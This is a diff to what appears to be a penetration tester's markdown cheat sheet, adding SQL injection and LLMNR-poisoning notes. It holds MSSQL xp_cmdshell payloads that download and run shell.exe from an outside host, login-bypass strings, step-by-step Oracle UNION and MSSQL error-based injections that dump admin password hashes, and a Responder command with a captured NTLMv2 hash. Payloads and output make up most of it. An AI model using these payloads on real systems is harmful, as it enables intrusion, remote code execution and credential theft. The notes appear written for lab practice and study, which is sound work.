@@ -1,4 +1,227 @@
-# Generic SQL Injection Payloads
+# SQLi
+
+### SQL Injection
+#### Reference page
+````
+https://github.com/swisskyrepo/PayloadsAllTheThings
+````
+#### Testing sqli in every input field
+````
+';#---
+````
+#### MSSQL login page injection
+##### Reference page
+````
+https://www.tarlogic.com/blog/red-team-tales-0x01/
+````
+````
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution
+````
+##### Exploitation
+````
+';EXEC master.dbo.xp_cmdshell 'ping 192.168.119.184';--
+';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://192.168.119.184:443/shell.exe C:\\Windows\temp\shell.exe';--
+';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\shell.exe';--
+````
+#### SQL and php login page
+##### vulnerable code
+
+````
+found a db.php file/directory. In this case fuzzed with ffuf, the example in our ffuf bruteforcing login pages will help on this
+````
+
+````
+<?php
+
+include 'dbconnection.php';
+$userid = $_POST['userid'];
+$password = $_POST['password'];
+$sql =
+"SELECT * FROM users WHERE username = '$userid' AND password = '$password'";
+$result = mysqli_query($db, $sql) or die(mysqli_error($db));
+$num = mysqli_fetch_array($result);
+	
+if($num > 0) {
+	echo "Login Success";
+}
+else {
+	echo "Wrong User id or password";
+}
+?>
+````
+##### php sql login by pass
+
+````
+admin' -- ' --
+````
+#### Research Repo MariaDB
+
+<img src="https://user-images.githubusercontent.com/127046919/224163239-b67fbb66-e3b8-4ea4-8437-d0fe2839a166.png" width="250" height="240" />
+
+````
+Background information on sqli: scanning the network for different services that may be installed. A mariaDB was installed however the same logic can be used depending on what services are running on the network
+````
+
+````
+admin ' OR 1=1 --
+````
+
+````
+1' OR 1 = 1#
+````
+#### Oracle DB bypass login
+
+````
+admin ' OR 1=1 --
+````
+#### Oracle UNION DB dumping creds
+
+````
+https://web.archive.org/web/20220727065022/https://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
+````
+
+````
+' 
+Something went wrong with the search: java.sql.SQLSyntaxErrorException: ORA-01756: quoted string not properly terminated 
+' OR 1=1 -- #query
+Blog entry from USERA with title The Great Escape from 2017
+Blog entry from USERB with title I Love Crypto from 2016
+Blog entry from USERC with title Man-in-the-middle from 2018
+Blog entry from USERA with title To Paris and Back from 2019
+Blog entry from Maria with title Software Development Lifecycle from 2018
+Blog entry from Eric with title Accounting is Fun from 2019
+' union select 1,2,3,4,5,6-- #query
+java.sql.SQLSyntaxErrorException: ORA-00923: FROM keyword not found where expected
+ ' union select 1,2,3,4,5,6 from dual-- #Adjust for more or less columns
+java.sql.SQLSyntaxErrorException: ORA-01789: query block has incorrect number of result columns
+ ' union select 1,2,3 from dual-- #adjusted columns
+java.sql.SQLSyntaxErrorException: ORA-01790: expression must have same datatype as corresponding expression ORA-01790: expression must have same datatype as corresponding expression 
+ ' union select null,null,null from dual-- #query
+Blog entry from null with title null from 0
+' union select user,null,null from dual-- #query
+Blog entry from example_APP with title null from 0
+' union select table_name,null,null from all_tables-- #query
+Blog entry from example_ADMINS with title null from 0
+Blog entry from example_CONTENT with title null from 0
+Blog entry from example_USERS with title null from 0
+' union select column_name,null,null from all_tab_columns where table_name='example_ADMINS'-- #query
+Blog entry from ADMIN_ID with title null from 0
+Blog entry from ADMIN_NAME with title null from 0
+Blog entry from PASSWORD with title null from 0
+' union select ADMIN_NAME||PASSWORD,null,null from example_ADMINS-- #query
+Blog entry from admind82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892 with title null from 0
+````
+
+#### MSSQL Error DB dumping creds
+##### Reference Sheet
+
+````
+https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
+````
+
+<img src="https://user-images.githubusercontent.com/127046919/228388326-934cba2a-2a41-42f2-981f-3c68cbaec7da.png" width="400" height="240" />
+
+##### Example Case
+
+````
+' #Entered
+Unclosed quotation mark after the character string '',')'. #response
+````
+###### Visualize the SQL statement being made
+
+````
+insert into dbo.tablename ('',''); 
+#two statements Username and Email. Web Server says User added which indicates an insert statement
+#we want to imagine what the query could potentially look like so we did a mock example above
+insert into dbo.tablename (''',); #this would be created as an example of the error message above
+````
+##### Adjusting our initial Payload
+
+````
+insert into dbo.tablename ('1 AND 1=CONVERT(INT,@@version))--' ,''); #This is what is looks like
+insert into dbo.tablename('',1 AND 1=CONVERT(INT,@@version))-- #Correct payload based on the above
+',1 AND 1=CONVERT(INT,@@version))-- #Enumerate the DB
+Server Error in '/Newsletter' Application.#Response
+Incorrect syntax near the keyword 'AND'. #Response
+',CONVERT(INT,@@version))-- #Corrected Payoad to adjust for the error
+````
+##### Enumerating DB Names
+
+````
+', CONVERT(INT,db_name(1)))--
+master
+', CONVERT(INT,db_name(2)))--
+tempdb
+', CONVERT(INT,db_name(3)))--
+model
+', CONVERT(INT,db_name(4)))--
+msdb
+', CONVERT(INT,db_name(5)))--
+newsletter
+', CONVERT(INT,db_name(6)))--
+archive
+````
+##### Enumerating Table Names
+
+````
+', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM archive.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--
+pEXAMPLE
+````
+##### Enumerating number of Columns in selected Table
+
+````
+', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE')+CHAR(58)+CHAR(58))))--
+3 entries
+````
+##### Enumerate Column Names
+
+````
+', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
+alogin
+
+', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 2 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
+id
+
+', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 3 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
+psw
+````
+##### Enumerating Data in Columns
+
+````
+', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 1 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
+3c744b99b8623362b466efb7203fd182
+
+', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 2 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
+5b413fe170836079622f4131fe6efa2d
+
+', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 3 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
+7de6b6f0afadd89c3ed558da43930181
+
+', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 4 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
+cb2d5be3c78be06d47b697468ad3b33b
+````
+### llmnr-poisoning-responder
+#### http
+````
+https://juggernaut-sec.com/llmnr-poisoning-responder/
+````
+````
+responder -I tun0 -wv
+````
+![image](https://user-images.githubusercontent.com/127046919/233516797-36702551-f60a-4d0e-866a-7c3a8e2971c1.png)
+
+````
+
+[+] Listening for events...                                                                                                                                                                                                                 
+
+[HTTP] Sending NTLM authentication request to 192.168.54.165
+[HTTP] GET request from: ::ffff:192.168.54.165  URL: / 
+[HTTP] NTLMv2 Client   : 192.168.54.165
+[HTTP] NTLMv2 Username : HEIST\enox
+[HTTP] NTLMv2 Hash     : enox::HEIST:4c153c5e0d81aee9:4F46F09B4B79350EA32DA7815D1F0779:01010000000000006E6BEC31EC73D90178BAF58029B083DD000000000200080039004F005500460001001E00570049004E002D00510042004A00560050004E004E0032004E0059004A000400140039004F00550046002E004C004F00430041004C0003003400570049004E002D00510042004A00560050004E004E0032004E0059004A002E0039004F00550046002E004C004F00430041004C000500140039004F00550046002E004C004F00430041004C000800300030000000000000000000000000300000C856F6898BEE6992D132CC256AC1C2292F725D1C9CB0A2BB6F2EA6DD672384220A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E00340039002E00350034000000000000000000
+````
+
+### Generic SQL Injection Payloads
 ```
 '
 ''
